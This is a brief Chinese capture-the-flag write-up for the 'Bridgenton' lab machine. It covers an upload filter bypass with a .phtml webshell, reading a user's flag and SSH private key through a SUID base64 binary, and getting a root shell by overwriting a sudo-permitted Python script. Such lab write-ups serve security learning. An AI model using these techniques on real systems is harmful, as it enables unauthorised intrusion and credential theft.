# Bridgenton

2025.03.24 https://thehackerslabs.com/bridgenton/

[video](https://www.bilibili.com/video/BV1Q3oQY1EdA/?spm_id_from=333.1387.homepage.video_card.click&vd_source=aed2f374c732513d2e535afafb1fd2ec)

## Ip

192.168.5.39

## Scan

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

注册http://192.168.5.39/registro.php用户，提示说只能上传图片格式的结尾，但是上传图片后不对，尝试上传其他结尾，发现结尾.phtml 能上传 webshell 到 /uploads 直接获得 www-data 的 shell。

suid 发现 james 的/usr/bin/base64 但 www-data 无法访问 james 目录，通过 base64 读取 user flag:

```
www-data@Bridgenton:/home$ /usr/bin/base64 /home/james/user.txt | /usr/bin/base64 -d
8e18fa38b2b24be6999bf8bf00a47cb5
```

这个 suid 能读取 james 的文件，尝试读取 id_rsa 能拿到

```
www-data@Bridgenton:/home$ /usr/bin/base64 /home/james/.ssh/id_rsa | /usr/bin/base64 -d
```

id_rsa 有密码 bowwow 对 james 进行登陆。

sudo -l 显示 (root) NOPASSWD: /usr/bin/python3 /opt/example.py

发现 opt 目录对 james 有写权限，直接删除 py，然后重建 py 文件：

```
rm -rf /opt/example.py
echo 'import os; os.system("/bin/bash")' > /opt/example.py
sudo -u root /usr/bin/python3 /opt/example.py
```

拿到 root flag：

```
root@Bridgenton:~# cat root.txt
73f441f6bf5ed73b61dc53d317d51478
```
